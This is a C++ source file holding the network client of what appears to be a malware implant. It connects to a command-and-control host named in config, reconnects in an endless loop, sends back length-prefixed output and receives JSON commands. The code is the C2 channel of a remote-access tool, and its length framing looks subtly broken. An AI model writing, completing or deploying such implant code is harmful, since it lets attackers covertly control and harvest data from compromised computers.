#include <nlohmann/json.hpp>
#include "config.h"
#include "client.h"

void Client::Connect()
{
	boost::asio::ip::address addr = boost::asio::ip::address::from_string(CNC_HOST);
	tcp::endpoint cnc(addr, CNC_PORT);

	try
	{
		m_sock.connect(cnc);
	}
	catch (boost::system::system_error&)
	{
		m_sock.close();
		Sleep(RECONNECT_TO_CNC_INTERVAL_IN_SECONDS * 1000);
		Connect();
	}
}

void Client::Send(std::string data)
{
	if (data.empty())
		data = "No output.";
	size_t len = data.length();
	m_sock.send(boost::asio::buffer(std::to_string(len)));
	m_sock.send(boost::asio::buffer(data));
}

json Client::Receive()
{
	std::string len, buff;
	len.resize(128);
	m_sock.receive(boost::asio::buffer(len));
	buff.resize(std::stoi(len));
	m_sock.receive(boost::asio::buffer(buff));
	return json::parse(buff);
}
